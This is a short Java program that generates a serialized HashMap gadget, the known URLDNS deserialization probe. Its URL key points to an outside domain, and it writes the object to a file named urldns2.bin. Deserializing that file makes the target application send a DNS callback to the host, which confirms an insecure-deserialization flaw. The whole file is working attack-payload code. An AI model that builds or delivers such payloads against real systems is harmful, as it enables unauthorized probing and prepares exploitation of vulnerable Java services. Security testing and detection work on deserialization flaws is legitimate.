import java.io.*;
import java.util.*;
import java.net.*;
import java.lang.reflect.Method;

public class Dns2 {

	public static void main(String[] args) throws Exception {

		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL url = new URL("http://dnsss2.sapo.shk0x.net");

		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if (method.getName().equals("putVal")) {
				method.setAccessible(true);
				method.invoke(hashMap, -1, url, 0, false, true);
			}
		}

		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns2.bin"));
		oos.writeObject(hashMap);

		/* Leer objeto desde el archivo
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns2.bin"));
		ois.readObject();
		*/
    }

}
